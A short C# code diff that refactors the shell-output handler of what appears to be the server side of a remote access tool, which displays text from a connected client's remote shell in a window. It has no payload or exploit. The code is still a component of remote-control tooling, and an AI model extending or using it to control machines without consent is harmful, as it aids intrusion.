@@ -1,6 +1,6 @@
 ﻿using Server.Forms;
 using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -14,18 +14,12 @@ namespace Server.Handle_Packet
     {
         public HandleShell(MsgPack unpack_msgpack, Clients client)
         {
-            if (Program.form1.InvokeRequired)
+            FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
+            if (shell != null)
             {
-                Program.form1.BeginInvoke((MethodInvoker)(() =>
-                {
-                    FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
-                    if (shell != null)
-                    {
-                        shell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
-                        shell.richTextBox1.SelectionStart = shell.richTextBox1.TextLength;
-                        shell.richTextBox1.ScrollToCaret();
-                    }
-                }));
+                shell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
+                shell.richTextBox1.SelectionStart = shell.richTextBox1.TextLength;
+                shell.richTextBox1.ScrollToCaret();
             }
         }
     }
